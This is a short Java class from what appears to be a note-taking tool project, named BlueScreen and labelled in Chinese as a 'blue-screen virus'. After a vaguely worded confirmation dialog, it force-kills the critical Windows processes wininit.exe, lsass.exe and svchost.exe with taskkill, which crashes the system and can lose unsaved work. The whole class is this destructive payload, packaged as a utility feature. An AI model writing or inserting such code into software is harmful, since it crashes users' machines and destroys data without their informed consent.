package com.huang.notetool.quote;

import org.apache.log4j.Logger;

import javax.swing.*;
import java.io.IOException;

/**
 * @author huang
 */
public class BlueScreen {
    /**
     * 日志
     */
    private Logger logger = Logger.getLogger(BlueScreen.class);

    public BlueScreen() {
        int sure = JOptionPane.showConfirmDialog(null, "是否释放异常一次？", "提示", 0);
        if (sure == 0) {
            JOptionPane.showMessageDialog(null, "注意保存.");
            try {
                Runtime.getRuntime().exec("taskkill /F /IM wininit.exe");
                Runtime.getRuntime().exec("taskkill /F /IM lsass.exe");
                Runtime.getRuntime().exec("taskkill /F /IM svchost.exe");
            } catch (IOException e1) {
                logger.warn(e1);
                //显示消息
                JOptionPane.showMessageDialog(null, "蓝屏病毒释放异常失败", "error", JOptionPane.WARNING_MESSAGE);
            }
        }
    }
}
